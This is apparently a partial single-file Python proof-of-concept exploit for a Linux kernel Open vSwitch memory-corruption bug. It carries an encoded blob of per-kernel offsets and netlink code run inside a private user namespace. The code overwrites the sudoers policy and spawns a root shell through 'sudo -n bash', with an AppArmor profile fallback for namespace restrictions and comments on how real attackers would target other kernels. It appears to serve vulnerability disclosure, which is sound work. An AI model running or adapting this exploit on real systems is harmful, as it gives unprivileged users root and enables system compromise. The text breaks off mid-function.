9@qV=d8<P9rr^^L~ib*`@C5^a%YoYSSG6qG^OiXoN=S{6hD1cnsyyToFfTgl6Utq4Nvv2WAeXCy~}=G%lJFqcIwzc{9Z5yhfLOiS(U5>CaWPHqol6Num)Np?Nbz=*JVf>&@_{mX@+mp?Nc8IvlBydbV1c>G0<(^+2<9xVs4N<<(jJtypLmlhd@|fiy_ZHqkN`X(n2p7t(zbEeUI*QabHa{Q=fs4c5FMf^}Z3!@vuo?MXdEMX5MXi_sWOA09@}V02HXwC}x1Yoqw65E`KonysY>{dhv}x*qPLGEwt_h}1|uTP<DE>+yW0em5fRXg?o@sC0D9v>-G>&(-7MTi>J9($7rj{^!Hnfye8sg!F0s$EHxW7CPzx(jX1ebG1y5MVcOu=Y@2Ck4KHQO<mKq*P_81tihTd53tUQbv4lA;kt5Z2{*S|Xqv`ojGoD8>m-ab+LL-bC!>en5VuyliZ?{8#_IXr5JM@vAwE~D``!?5T@io1zT74rx=<?GDq0c`ghuGkLK}7WC$5FIt;G1g(7qK>bPH{jHMT7;@$_>N+OOVj&Nde(M_ov#pKdAr)Bk+;-K(E|e)Hm=KYaV@zyH=;6o0k8NSpFh8C{5qM@7^|?HSZ&4-;w+sNI!<4C$TX>zmz7$c@~{&0Z$t&LX$!-Joasx~l8i+C^atH9{lwTn&5Gi1$Tm>*pr)j*U!8q7m*QA~jO8?E|T2kh*V{-1KjuR%QKx&<KstZ2LgyM-zI)y#S%B8mW<*S#qS#F17AWJ?!0H>ZViAH~W~FO+;vfo->#BinIfv?+D#D^>QP%jV5q=3#pNM#wqd<wKP-Yi<DXhCKRjtb1!F2-XYPYL2``7XpEj|irkLqpk|8v`5E0+Pq#brs?_J9$fmIxtI4LZI<wWL-|F&~(P^e7Wgdk|n?8)@lr2VMG;2;V`f-i!ucuGb{Gmv+q2?N^u^Own?1I&~t?ui}tNIcT8(kSKx5g0~p=axx_JPC$p+{uXtr<k^Qs1<8NR8A;&4yE?&MUR;le(0yZoHyOLOUM~LL)Rn&n2`dMJ<iccZBY$rEl+|mNF_*52QwFc2OgBUa8CBt)}IeZKm3!?mVZXLv7SXZFW(k_T#EOW*7B#??<h7sJ~01RnZ!DQ6o2UQ*R@8F1fWDl)L`v0kO9?6>G7ZJX=*!sJBrYwW+sJ`*GF&lG`s*7HP?zxw+hh+{lgG)Z56NLvB4R_n_G6Rr1^S7wJ_}Ow>Lqq25Mq)TZ7>?MGF6Oue1@vm3o_y5^-#w2pckxsjWC8@aQ|J^V7M%UxopO9X{W{UqX}ut@~9QJZ=jwI5gQQT2B7I$7&orrjcS$!$ILHgY33_4X`s?=Vj6pmAcyRHot!ZK6^)Spt<QzTq2{>D-m+{W`R}R@IYL9GkRW>nJ)Z7j;GDhm6QLN97j+N$Yd`XLd6zx3Rl=(V8uDbv+wWFPdf#C~BkjT=i@vfqE9TJJcRqZ{KX5v#H*`zKVj}$c@~2>+LdF>g{JKw;z_<@0zu4Hqq&nkT_GLO}&lUs6AJ`%>{4N?o@m1<lg5CS5n=iCCH83$emU0Qpu=#+Xd?FMadlogOV^hCwaYj-|T<3$!)XkNE6@&Zr}!P;LZTI8-&}9Ew~fhY0;67Iz(3iH*f>@99c;@?gAEYFAeU&s3eS<0ZG>j6Wmf2s!I1|RSDd{4ct$tN!qn<z5w?E;2xab3t?<j^5fBEvn<0#Wumsg4cx#D+`yd;?l1`V&DB}i)mf6@PWQsoSYi|h+`tXozzy8F;I0PuL05Y0x{M#re=nptA1<Fq%7GiWfg8AiI|JN<T_x4{Zou_f{f(P;f#~W}FE?<1eQ>wFL_KhOwG-|z2)8Sj3AYX1a7)z<cl%xOKHMSf9KW$%mlAe2ay!FG@#Vl>9;oKzp_0|xcbhJ@O^4Q>W+cTF%0vmD0&OO4fEuWQ8mMzYZB}oO-j9YlwTv`t`frA7IBE#gKs_JS+5`2og}S?<?%EyIo`O^om5t5-HBbZf3{Z;`rAO?HYM^F@eR)uy*WdG}UzUDc-@a01bRjy@53I)Oxr%CIEk*V7wA!xL|N1bxsBWhpsp*=NS3nKaPcWvYs9qq{|EY!9i)t6GXJ<B4Lp3joP@SD>*Y~36`ofQ!V_mLRnioZ&25N$8pq>Hh{-AoN)gda0mPbXb#%h9Utj=t;?+dE^E~uOC4?|E5)IdEG)T6fYIb(F$`qlvIg+Sete)vDc_ALmx9)LM5iZb<8TNNb$HedtxEGdYt{HVTaz+NQS{VB+e*_~~Buh*B`p~bRku@0mmn2p&K*_fT(?6NNnDTj*e)Dx1x)-K(3H1^Y>0>B1rz@~i<urq?)*S=SF<{`gcZ3FC(@(@!+>!BK|p_=wRsLoAwPk>$a&zYY!$G==uo)846ftvO`pq>Hh{@{9-)lKhSw6t1dHCEHUht-*_4t;@j*afwUbzN;7Py;nk^Rfuk*`e+Ws>5Id->+9&vUM7b5fzm{He^FKi%}svH`zUbb?Arsv?!!V*I>#hKn>JD{p6q~uwEY2{ektc)m5R(=;{xaIAJwb(*=UnnXRt+0_$q%ewR_Hvsz3vB~Sx3P|p=uD@$Mv)VHC&j;nS5D9mYEk1E?%5GrfH25d%Q06Ra}eJ_mF?hb2LM#Cr!R6{j^HB{%NTC0Al>z^CWL39l@3sSKft8ZIvBy?IGlp3(QYW-dkSY!2FtL^IT=4^9ua@1*c*M*ojFaG(%x3B*DZ?`VR=%^|#<zhBw&t^8w)|lOC_Q2}BPj;tlB-t%C9b|Man(K{Dzzy8MO|cE!8Q^w<aJwO}|FJpVf-PyU6YD}S8?!MRvvZp*GGw;Mu7IT3#pjv_NRG*1HfCcsX6H7$95lNeGW*jwdPq}_+C<B$Ys|*%+014f{dt-l2F(sbX1~7Lo+l7pC>`q$8vQUEv*&w=WQYc{JIo%Kqq&u9H<RkR$w*XmB@dCn4cs>!+O5CPtqyJDhdQ)v*a5dORsAosv)I;^(mojAUJl$^eRI4y)MmB*?f5g3x1J(9seZ9JJXxO=+h1a(|2TYquFW^P_;aeWSIX6YKllr3qc&=1Rl96|C5F^CqELHzY9F1RUmasNc4PNf7L_<%T07!N(t53kw-;r1nqNQo<;a?Y+f?qBI~_}Jnn+9vNF;E32C)$vu@O7F*m^&)Q>5L9UDkihqH@edA~s^rC$<iDoY?FgS(ezct+DOY8e2sb5F4=(8?g~Puh@D&vD-DaNxS`6!;0AX#cuulvlZKT6|4;--XLq%+gH{R`>PjQuk`A8^UM0`^m4q_H@p1`DU^%0iu!YPUHti2`?CB+^ZJO|)Y+NqY*Tu&>}RR=zORqla|dUsJzFF?&Fdp#Ble8Rh$xbg=P35xS@s>V6&J-28?omRTbvHnm>Sy{?E~G}ixRu^s#L1}H$yX#HNwi*pX6=%hc1J1!FZ$o5IIoxk5a9V%hLAmCBbj}#_znt?0!tYU-H|MY~y$G+q&(b`ycMe9vx|i-}sH+_>JFB-ft_~sj9s8+g7CwLE$%k<2O4=@OwtTW%^DMS;^hGcE1ujOHdoN*-3)h8P%S=lLWi5n_g~ux%1e4i|bpEe~I1067JI(y<L8KR%n$vqqTgx!q{|1hr`YKP#t0*22#J$8BP6~p?=-JGy2n1OVu2Tk!U&Yh1iIV*od83>^=7~eLC&coQW|Kg)=dTjo8exAa+)<_nu|BU1KX3g=36}jo65d*qO!Nb1&1K8e2t8jg8p6<;^mEC_!XI_p>ps2Ae*NMTxz>IQmtu^cTH7{xv;3HivW5d!q``g{Y+XM%DiUYp@3Ed{}#1`Voy6QabB|QI%z3{h!TQ+N4+iKiyvcKi~Z@-t00uh1r-*B*J(KW@j?nOdn4%_s=etE9GeKLv7S%JO#D$sXci-1-r2uyJ_^p?)mKAzcu^&i<9jmWR+H++WLcYUWkp@w2dHkR<ZYP^t&y#OPwQ#jo64yjg8p(#J1CpoWHy}O=kwu0Y()yN6rx&v8k~UJFD1}PUe0V+t_GGMGzaY=Xis(s`(e4BhOB3JGpVh-hX>^D;0Qq#B9u_Zv?ZmnLV{_1i6tLxgRGVamtctKR>xA?DPBes(7{jSQKTUL$od$M?3=9fISn~zVZax&k*cMJtGa+q5cyPl|;)6BwzzJ6*ge!1KaOkVW$Vk1hzKypR(vI`&R)Qu&J;CJ1^LKSJ-W^>k2zW1=xTM*mR5lc0RDn$sHqQ*Sn+kygOnxX45f(+1bpV+A)IM$c^0O*~mSc+|xTov`rl&;#e~R*nmx*4cK|X-v69f3+yuLDq8Yvzy@q8Y{1S3c9^!vuL0ZDA5ojAsjvYXu&J;CJ15wad$JSQHY!7f4cLH9#|U8O1iPBtF;aECI|}cPn2p(Vj9_*?v!`~9AUAR&H+eR4&nEY({tewP&wh1&wv9(ZAvzi#oh2RtY`_L=z|IP`-Lu8-YO@8qs*O&U#2j~N02{CY8?f_&?WXl)i%ui!PND{Ezy@qOMgTh}*s_g8?4(FUqA^j3L;xGG=K@<g9w`C)Ie=~V9HMDOBF%Aida?l<umKyeGlT7>O+9WS5u+JX2W-H;1-9-1+p91DcG=Omcc;HEhz^w<mtlMVwPx72jIO^&`ytZ@YISksSHJ)IWiur&ug;3XrGhi9jm9th!moD08M^zELr33otKcmCh=NmDrJk8z_Y2NlqLp7HTKY%mB%1bV4~1yD3J`4u(ON(M75pQ#%JPrUrY`AR`yY*aCoXibrJ}1~DgOwq4`iiR$D3c)SErX>_7Bf5uTG0X3gu$`;XYplEdE?o@{0~f3|oLUWoTZst18%Wqs@vjx#gg3CXP1Ozry_ixpJiivoRa9Gn#FxN~thzv{^#H?8TWqZL}G=ksG-mBlPuNmCnh+Lto_XkbD1Cov+uI+n~hOe@l;Iqp8TW0UNLZ8?dv2t@j^oPGD<WsHQE9<F0@W*t3Cc{J6G?(vxQ|3GBUhE8nTGRn!95fDPDy4cJ-1*85M&wJPkiKM1e^8?cE)06QDlc6x@bL#nWwVL8ACY`_L=z|IP`Ov|v-XtRsfM4`e4Y`_L=z|ITyp8J&lu{qv?Eom2pxM-N=25i74!v^e}VDG)2^LB+TmI@oN0UNLZJ2%*SuIId0Vbj(J*z6XW1#FShRetw+&a@!3s<^<tB(Q&7UmS1FHphCUKmGeJdU^b7dUkB&POC+9h}I^%zezXUN5TDH|NFoGe|8h;EC")
# END EMBEDDED KERNEL RECORDS
def uname_a() -> str:
    uname = os.uname()
    return " ".join(
        (
            uname.sysname,
            uname.nodename,
            uname.release,
            uname.version,
            uname.machine,
        )
    )


def acknowledge_unknown_kernel() -> None:
    print(
        "This is a memory-corruption-based PoC -- it requires per-kernel-build "
        "derived values (offsets, etc.). These were pre-derived for a number of "
        "kernels in this single-file PoC, but yours is NOT among "
        f"them: {uname_a()}.\n\n"
        "Therefore, the PoC will attempt to _dynamically derive_ the offsets, "
        "etc., from readable local System.map files or nonzero /proc/kallsyms "
        "for symbol offsets; readable /sys/kernel/btf/* files or unstripped "
        "local kernel build objects via pahole for struct layouts; and loaded "
        "/sys/kernel/btf/openvswitch module BTF for "
        "OVS_KEY_ATTR_TUNNEL_INFO. These are often available to unprivileged "
        "users across distros, but the availability depends on various "
        "security settings. If they are NOT available, the PoC will report "
        "this and terminate. (Note: pahole must be already installed for the "
        "dynamic derivation; an actual attacker would just package it in the "
        "PoC).\n\n"
        "By proceeding, you acknowledge that such early termination would NOT "
        "imply your kernel is not affected, since your kernel could still be "
        "vulnerable despite these sources not being reachable by an "
        "unprivileged attacker; an unprivileged attacker could still trivially "
        "target the PoC at your kernel by obtaining the symbols in a myriad of "
        "other ways (e.g., matching distro debuginfo/kernel-devel packages, "
        "System.map/vmlinux/BTF from the vendor kernel package, a second "
        "machine running the same kernel build, rebuilding the same "
        "source/config locally, public distro debug repositories, or any "
        "privileged read of the target's symbol/debug files).\n\n"
        "For a definitive check of whether you are affected, see "
        "https://heyitsas.im/posts/ovswrap",
        flush=True,
    )
    try:
        answer = input("Acknowledge? [Y/N]: ")
    except EOFError as exc:
        raise RuntimeError(
            "terminated: no Y/N acknowledgement was received for dynamic "
            "derivation on an uncovered kernel"
        ) from exc
    if answer.strip().lower() == "y":
        return
    raise RuntimeError(
        "terminated: user refused to acknowledge that dynamic-derivation "
        "failure on an uncovered kernel would not imply non-affectation"
    )


def require_pahole_for_dynamic_derivation() -> None:
    if shutil.which("pahole") is None:
        raise RuntimeError(
            "kernel is not covered by pre-derived kernel records, and pahole is "
            "required to dynamically derive kernel struct offsets from local "
            "debug info. This does NOT mean you are not affected, as a real "
            "attacker would just package the equivalent functionality into "
            "the PoC or otherwise target the PoC at this kernel. For a "
            "definitive check of whether you are affected, see "
            "https://heyitsas.im/posts/ovswrap"
        )


def json_object(value: Any, source: str) -> dict[str, Any]:
    if not isinstance(value, dict):
        raise RuntimeError(f"{source}: expected a JSON object")
    return value


def json_int(obj: dict[str, Any], field: str, source: str) -> int:
    value = obj.get(field)
    if not isinstance(value, int) or isinstance(value, bool):
        raise RuntimeError(f"{source}: {field} must be an integer")
    return value


def json_str(obj: dict[str, Any], field: str, source: str) -> str:
    value = obj.get(field)
    if not isinstance(value, str):
        raise RuntimeError(f"{source}: {field} must be a string")
    return value


def json_str_tuple(obj: dict[str, Any], field: str, source: str) -> tuple[str, ...]:
    value = obj.get(field)
    if not isinstance(value, list) or not all(isinstance(item, str) for item in value):
        raise RuntimeError(f"{source}: {field} must be a string list")
    return tuple(value)


def json_carrier(obj: dict[str, Any], field: str, source: str) -> str:
    value = json_str(obj, field, source)
    if value not in CARRIER_ORDER:
        raise RuntimeError(f"{source}: {field} has unknown carrier {value!r}")
    return value


def parse_kernel_offsets(value: Any, source: str) -> KernelOffsets:
    obj = json_object(value, source)
    values: dict[str, Any] = {}
    for kernel_field in fields(KernelOffsets):
        if kernel_field.name == "dst_entry_ref_kind":
            values[kernel_field.name] = json_str(obj, kernel_field.name, source)
        else:
            values[kernel_field.name] = json_int(obj, kernel_field.name, source)
    ref_kind = values["dst_entry_ref_kind"]
    if ref_kind not in ("__rcuref", "__refcnt"):
        raise RuntimeError(f"{source}: invalid dst_entry_ref_kind={ref_kind!r}")
    return KernelOffsets(**values)


def parse_kernel_build_record(value: Any, source: str) -> KernelBuildRecord:
    obj = json_object(value, source)
    return KernelBuildRecord(
        release=json_str(obj, "release", source),
        version=json_str(obj, "version", source),
        machine=json_str(obj, "machine", source),
        offsets=parse_kernel_offsets(obj.get("offsets"), f"{source}.offsets"),
        read_carrier=json_carrier(obj, "read_carrier", source),
        write_carrier=json_carrier(obj, "write_carrier", source),
        read_lanes=json_str_tuple(obj, "read_lanes", source),
        ovs_key_attr_tunnel_info=json_int(obj, "ovs_key_attr_tunnel_info", source),
    )


def load_kernel_build_records() -> tuple[KernelBuildRecord, ...]:
    source = KERNEL_RECORDS_DESCRIPTION
    try:
        encoded = base64.b85decode(_KERNEL_RECORDS_B85)
        value = json.loads(zlib.decompress(encoded))
    except (ValueError, zlib.error, json.JSONDecodeError) as exc:
        raise RuntimeError(f"{source} is malformed: {exc}") from exc

    if not isinstance(value, list):
        raise RuntimeError(f"{source}: expected a JSON array")
    return tuple(
        parse_kernel_build_record(item, f"{source}[{index}]")
        for index, item in enumerate(value)
    )


def parse_attrs(buf: bytes) -> list[Attr]:
    attrs: list[Attr] = []
    offset = 0
    while offset + 4 <= len(buf):
        length, attr_type = struct.unpack_from(NLA_HDR, buf, offset)
        if length < 4 or length > len(buf) - offset:
            break
        attrs.append(Attr(attr_type, buf[offset + 4 : offset + length], length))
        offset += align4(length)
    return attrs


class GenericNetlink:
    def __init__(self) -> None:
        self.sock = socket.socket(socket.AF_NETLINK, socket.SOCK_RAW, NETLINK_GENERIC)
        self.sock.bind((0, 0))
        self.seq = 1

    def request(
        self,
        nlmsg_type: int,
        cmd: int,
        version: int,
        payload: bytes = b"",
        flags: int = NLM_F_REQUEST | NLM_F_ACK,
    ) -> list[bytes]:
        seq = self.seq
        self.seq += 1
        genl = struct.pack(GENL_HDR, cmd, version, 0)
        message = genl + payload
        header = struct.pack(NLMSG_HDR, 16 + len(message), nlmsg_type, flags, seq, 0)
        self.sock.send(header + message)

        want_ack = bool(flags & NLM_F_ACK)
        replies: list[bytes] = []
        while True:
            data = self.sock.recv(1 << 20)
            offset = 0
            while offset + 16 <= len(data):
                length, msg_type, _msg_flags, rseq, _pid = struct.unpack_from(
                    NLMSG_HDR, data, offset
                )
                if rseq != seq:
                    offset += align4(length)
                    continue
                body = data[offset + 16 : offset + length]
                if msg_type == NLMSG_ERROR:
                    error = struct.unpack_from("i", body, 0)[0]
                    if error == 0:
                        return replies
                    raise OSError(-error, os.strerror(-error))
                replies.append(body)
                offset += align4(length)
            if replies and not want_ack:
                return replies

    def get_family(self, name: str) -> int:
        replies = self.request(
            GENL_ID_CTRL,
            CTRL_CMD_GETFAMILY,
            2,
            nla(CTRL_ATTR_FAMILY_NAME, cstr(name)),
            NLM_F_REQUEST,
        )
        for reply in replies:
            for attr in parse_attrs(reply[4:]):
                if attr.attr_type == CTRL_ATTR_FAMILY_ID:
                    return int(struct.unpack_from("H", attr.payload, 0)[0])
        raise RuntimeError(f"family {name} id not found")


def run_text(command: list[str]) -> str:
    result = subprocess.run(command, text=True, capture_output=True, check=False)
    return (result.stdout + result.stderr).strip()


def step(message: str) -> None:
    print(f"\n***{message}***", flush=True)


def log(message: str) -> None:
    print(message, flush=True)


def strip_c_comments(text: str) -> str:
    text = re.sub(r"/\*.*?\*/", "", text, flags=re.S)
    return re.sub(r"//.*", "", text)


def parse_btf_enum_value(
    btf_path: str, enum_name: str, constant_name: str
) -> int | None:
    pahole = shutil.which("pahole")
    if pahole is not None and os.access(btf_path, os.R_OK):
        commands = [[pahole, "-C", enum_name, btf_path]]
        base = os.path.join(os.path.dirname(btf_path), "vmlinux")
        if os.path.basename(btf_path) != "vmlinux" and os.access(base, os.R_OK):
            commands.append([pahole, f"--btf_base={base}", "-C", enum_name, btf_path])
        for command in commands:
            result = subprocess.run(
                command,
                text=True,
                capture_output=True,
                check=False,
            )
            if result.returncode == 0:
                value = parse_enum_from_text(result.stdout, enum_name, constant_name)
                if value is not None:
                    return value
    return None


def path_state(path: str) -> str:
    if not os.path.exists(path):
        return f"{path} (missing)"
    if not os.path.isfile(path):
        return f"{path} (not a regular file)"
    if not os.access(path, os.R_OK):
        return f"{path} (not readable)"
    return f"{path} (readable)"


def summarize_path_states(paths: list[str], limit: int = 14) -> str:
    if not paths:
        return "no candidate paths were configured"
    entries = [path_state(path) for path in paths[:limit]]
    if len(paths) > limit:
        entries.append(f"... {len(paths) - limit} more candidate paths omitted")
    return "; ".join(entries)


def parse_enum_from_text(text: str, enum_name: str, constant_name: str) -> int | None:
    text = strip_c_comments(text)
    match = re.search(rf"enum\s+{re.escape(enum_name)}\s*\{{(.*?)\}};", text, re.S)
    if not match:
        return None
    value = 0
    for raw_entry in match.group(1).split(","):
        entry = raw_entry.strip()
        if not entry:
            continue
        name, sep, explicit = entry.partition("=")
        name = name.strip()
        if sep:
            explicit_value = explicit.strip()
            if not re.fullmatch(r"0x[0-9A-Fa-f]+|[0-9]+", explicit_value):
                return None
            value = int(explicit_value, 0)
        if name == constant_name:
            return value
        value += 1
    return None


def derive_ovs_uapi_constants(record: KernelBuildRecord | None) -> None:
    global OVS_KEY_ATTR_TUNNEL_INFO

    if record is not None:
        OVS_KEY_ATTR_TUNNEL_INFO = record.ovs_key_attr_tunnel_info
        log(
            "UAPI: using pre-derived OVS_KEY_ATTR_TUNNEL_INFO="
            f"{OVS_KEY_ATTR_TUNNEL_INFO}"
        )
        return

    btf_path = f"{BTF_DIR}/openvswitch"
    tunnel_info = parse_btf_enum_value(
        btf_path, "ovs_key_attr", "OVS_KEY_ATTR_TUNNEL_INFO"
    )
    if tunnel_info is None:
        raise RuntimeError(
            "kernel is not covered by pre-derived kernel records, and this user "
            f"could not derive OVS_KEY_ATTR_TUNNEL_INFO from {btf_path}. "
            f"Checked: {path_state(btf_path)}"
        )
    if tunnel_info != OVS_KEY_ATTR_TUNNEL_INFO:
        log(
            "UAPI: OVS_KEY_ATTR_TUNNEL_INFO="
            f"{tunnel_info} from {btf_path} "
            f"(fallback was {OVS_KEY_ATTR_TUNNEL_INFO})"
        )
    OVS_KEY_ATTR_TUNNEL_INFO = tunnel_info


def checked_binary(name: str) -> str:
    if name == "sudo":
        wrapper = "/run/wrappers/bin/sudo"
        if os.access(wrapper, os.X_OK):
            return wrapper
    path = shutil.which(name)
    if path is None:
        raise RuntimeError(f"required command not found in PATH: {name}")
    return path


def optional_binary(name: str) -> str | None:
    return shutil.which(name)


def uid_map_first_entry() -> tuple[int, int, int, str]:
    with open("/proc/self/uid_map", "r", encoding="ascii") as handle:
        first_line = handle.readline().strip()
    fields = first_line.split()
    if len(fields) < 3:
        raise RuntimeError(f"unexpected uid_map format: {first_line!r}")
    return int(fields[0]), int(fields[1]), int(fields[2]), first_line


def process_status_line(prefix: str) -> str:
    with open("/proc/self/status", "r", encoding="ascii") as handle:
        for line in handle:
            if line.startswith(prefix):
                return line.strip()
    raise RuntimeError(f"/proc/self/status did not contain {prefix!r}")


def effective_capability_mask() -> int:
    line = process_status_line("CapEff:")
    fields = line.split()
    if len(fields) != 2:
        raise RuntimeError(f"unexpected CapEff line: {line!r}")
    return int(fields[1], 16)


def launching_user() -> tuple[int, int, str]:
    uid = os.getuid()
    gid = os.getgid()
    if uid == 0 or os.geteuid() == 0:
        raise RuntimeError(
            "refusing to run as root. Run this PoC directly as an ordinary "
            "non-sudo local user."
        )
    if effective_capability_mask() != 0:
        raise RuntimeError(
            "refusing to run with preexisting effective capabilities. Run this "
            "PoC as an ordinary unprivileged user."
        )
    try:
        username = pwd.getpwuid(uid).pw_name
    except KeyError:
        raise RuntimeError(f"uid {uid} has no passwd entry") from None
    return uid, gid, username


def ensure_user_starts_without_passwordless_sudo(username: str) -> None:
    step("CHECKING BASELINE SUDO ACCESS")
    sudo = checked_binary("sudo")
    result = subprocess.run(
        [sudo, "-n", "true"],
        text=True,
        capture_output=True,
        check=False,
    )
    detail = (result.stderr or result.stdout).strip()
    if result.returncode == 0:
        raise RuntimeError(
            f"refusing to run: user {username!r} already has passwordless sudo. "
            "Use a non-sudo ordinary user so the root-shell delta is meaningful."
        )
    print(f"baseline passwordless sudo for {username}: denied", flush=True)
    if detail:
        print(f"sudo denial detail: {detail.splitlines()[0]}", flush=True)


def spawn_root_shell(username: str) -> None:
    step("SPAWNING ROOT SHELL")
    sudo = checked_binary("sudo")
    shell = shutil.which("bash") or "/bin/bash"
    if not os.path.exists(shell):
        raise RuntimeError(f"root shell path missing: {shell}")
    print(
        f"RESULT: sudoers policy write achieved; spawning 'sudo -n {shell}' as "
        f"{username}",
        flush=True,
    )
    try:
        result = subprocess.run([sudo, "-n", shell], check=False)
    except OSError as exc:
        raise RuntimeError(
            f"failed to spawn root shell through sudo: errno={exc.errno} "
            f"{exc.strerror}"
        ) from exc
    if result.returncode != 0:
        raise RuntimeError(f"root shell exited with status {result.returncode}")
    print(
        "root shell exited; namespace pin process remains alive to avoid unsafe "
        "OVS teardown",
        flush=True,
    )


def namespace_prefix_works(prefix: list[str], env: dict[str, str]) -> tuple[bool, str]:
    probe = prefix + [
        sys.executable,
        "-c",
        "import os,sys; sys.exit(0 if os.geteuid() == 0 else 1)",
    ]
    try:
        result = subprocess.run(
            probe,
            env=env,
            text=True,
            capture_output=True,
            check=False,
            timeout=60,
        )
    except subprocess.TimeoutExpired:
        return False, "namespace probe timed out after 60 seconds"
    if result.returncode == 0:
        return True, ""
    detail = (result.stderr or result.stdout).strip()
    return False, detail.splitlines()[0] if detail else "<no output>"


def private_namespace_prefix(env: dict[str, str]) -> list[str]:
    unshare = checked_binary("unshare")
    direct = [unshare, "-Urn"]
    works, detail = namespace_prefix_works(direct, env)
    if works:
        log("namespace: direct unshare -Urn works")
        return direct
    log(f"namespace: direct unshare -Urn failed: {detail}")
    aa_exec = optional_binary("aa-exec")
    if aa_exec is None:
        raise RuntimeError(
            "direct unshare -Urn failed and aa-exec is not available for the "
            "AppArmor trinity fallback"
        )
    aa_prefix = [aa_exec, "-p", "trinity", "--", unshare, "-Urn"]
    log("namespace: trying aa-exec -p trinity -- unshare -Urn fallback")
    works, aa_detail = namespace_prefix_works(aa_prefix, env)
    if works:
        log("namespace: aa-exec -p trinity fallback works")
        return aa_prefix
    raise RuntimeError(
        "could not enter a private root-mapped user+network namespace. "
        f"direct unshare failed with: {detail}; aa-exec fallback failed with: "
        f"{aa_detail}"
    )


def run_child_in_private_namespace(
    host_user: str,
    writer_pid: int,
    writer_trigger_fd: int,
    writer_ack_fd: int,
) -> None:
    step("ENTERING PRIVATE USER AND NETWORK NAMESPACES")
    script = os.path.abspath(sys.argv[0])
    env = os.environ.copy()
    env[HOST_USER_ENV] = host_user
    env[HOST_WRITER_PID_ENV] = str(writer_pid)
    env[HOST_WRITER_TRIGGER_FD_ENV] = str(writer_trigger_fd)
    env[HOST_WRITER_ACK_FD_ENV] = str(writer_ack_fd)
    prefix = private_namespace_prefix(env)
    command = prefix + [sys.executable, script, "--child"]
    print(f"running child: {' '.join(command)}", flush=True)
    success = False
    try:
        completed = subprocess.run(
            command,
            env=env,
            check=False,
            pass_fds=(writer_trigger_fd, writer_ack_fd),
        )
        success = completed.returncode == 0
        if completed.returncode != 0:
            raise RuntimeError(
                f"namespace child failed with exit status {completed.returncode}"
            )
    finally:
        for fd in (writer_trigger_fd, writer_ack_fd):
            try:
                os.close(fd)
            except OSError:
                pass
        if not success:
            try:
                os.waitpid(writer_pid, os.WNOHANG)
            except ChildProcessError:
                pass
    spawn_root_shell(host_user)


def validate_child_namespace() -> str:
    host_user = os.environ.get(HOST_USER_ENV)
    if not host_user:
        raise RuntimeError("missing OVS_C004_HOST_USER from parent process")
    inside_uid, outside_uid, count, first_line = uid_map_first_entry()
    if os.getuid() != 0 or os.geteuid() != 0:
        raise RuntimeError("child is not uid 0 inside the private user namespace")
    if inside_uid != 0 or outside_uid == 0 or count != 1:
        raise RuntimeError(f"unexpected private uid_map format: {first_line!r}")
    return host_user


def inherited_sudoers_writer() -> tuple[int, int, int]:
    raw_pid = os.environ.get(HOST_WRITER_PID_ENV)
    raw_trigger_fd = os.environ.get(HOST_WRITER_TRIGGER_FD_ENV)
    raw_ack_fd = os.environ.get(HOST_WRITER_ACK_FD_ENV)
    if not raw_pid or not raw_trigger_fd or not raw_ack_fd:
        raise RuntimeError("missing inherited host sudoers writer state")
    try:
        writer_pid = int(raw_pid)
        trigger_fd = int(raw_trigger_fd)
        ack_fd = int(raw_ack_fd)
    except ValueError as exc:
        raise RuntimeError("invalid inherited host sudoers writer state") from exc
    for fd, label in ((trigger_fd, "trigger"), (ack_fd, "ack")):
        try:
            os.fstat(fd)
        except OSError as exc:
            raise RuntimeError(
                f"inherited host sudoers writer {label} fd {fd} is invalid: "
                f"errno={exc.errno} {exc.strerror}"
            ) from exc
    return writer_pid, trigger_fd, ack_fd

class BtfResolver:
    def __init__(self, btf_dir: str = BTF_DIR) -> None:
        self.btf_dir = btf_dir
        self._struct_cache: dict[str, tuple[str, str]] = {}
        self.paths = self.candidate_paths()
        self.readable = [
            path
            for path in self.paths
            if os.path.isfile(path) and os.access(path, os.R_OK)
        ]
        if not self.readable:
            raise RuntimeError(
                "kernel is not covered by pre-derived kernel records, and this "
                "user could not find readable local BTF or unstripped kernel "
                "build objects for pahole-based layout derivation. Checked: "
                f"{summarize_path_states(self.paths)}"
            )
        log(f"debug info: found {len(self.readable)} readable pahole source files")

    def candidate_paths(self) -> list[str]:
        ordered: list[str] = []
        seen: set[str] = set()

        def add(path: str) -> None:
            if path in seen:
                return
            seen.add(path)
            ordered.append(path)

        try:
            btf_entries = [
                os.path.join(self.btf_dir, entry)
                for entry in os.listdir(self.btf_dir)
            ]
        except OSError:
            btf_entries = []
        vmlinux_btf = os.path.join(self.btf_dir, "vmlinux")
        add(vmlinux_btf)
        for path in sorted(btf_entries):
            if path != vmlinux_btf:
                add(path)

        release = os.uname().release
        build_dir = f"/lib/modules/{release}/build"
        for path in (
            f"{build_dir}/net/openvswitch/conntrack.o",
            f"{build_dir}/net/openvswitch/openvswitch.o",
            f"{build_dir}/net/netfilter/core.o",
            f"{build_dir}/net/netfilter/nf_conntrack_core.o",
            f"{build_dir}/net/netfilter/nf_conntrack.o",
            f"{build_dir}/net/netfilter/nf_conntrack_ftp.o",
            f"{build_dir}/vmlinux",
            f"/usr/src/linux-{release}/vmlinux",
            f"/usr/lib/debug/boot/vmlinux-{release}",
            f"/usr/lib/debug/lib/modules/{release}/vmlinux",
            f"/usr/lib/debug/vmlinux-{release}",
        ):
            add(path)
        try:
            for entry in sorted(os.listdir("/usr/src")):
                add(os.path.join("/usr/src", entry, "vmlinux"))
        except OSError:
            pass
        return ordered

    def struct_text(self, type_name: str) -> tuple[str, str]:
        cached = self._struct_cache.get(type_name)
        if cached is not None:
            return cached
        errors: list[str] = []
        for path in self.readable:
            commands = [["pahole", "-C", type_name, path]]
            if not path.startswith(self.btf_dir + os.sep):
                commands = [["pahole", "-F", "dwarf", "-C", type_name, path]]
            elif path != os.path.join(self.btf_dir, "vmlinux"):
                commands.append(
                    [
                        "pahole",
                        f"--btf_base={os.path.join(self.btf_dir, 'vmlinux')}",
                        "-C",
                        type_name,
                        path,
                    ]
                )
            for command in commands:
                result = subprocess.run(
                    command,
                    text=True,
                    capture_output=True,
                    check=False,
                )
                if f"struct {type_name}" in result.stdout:
                    log(f"debug info: found struct {type_name} in {path}")
                    found = (path, result.stdout)
                    self._struct_cache[type_name] = found
                    return found
                if result.stderr.strip():
                    errors.append(f"{path}: {result.stderr.strip().splitlines()[-1]}")
        raise RuntimeError(
            f"required debug type struct {type_name} was not found in readable "
            "local BTF or unstripped kernel build objects"
            + (f" (last errors: {'; '.join(errors[-3:])})" if errors else "")
        )

    def field_offset(self, type_name: str, field_name: str) -> int:
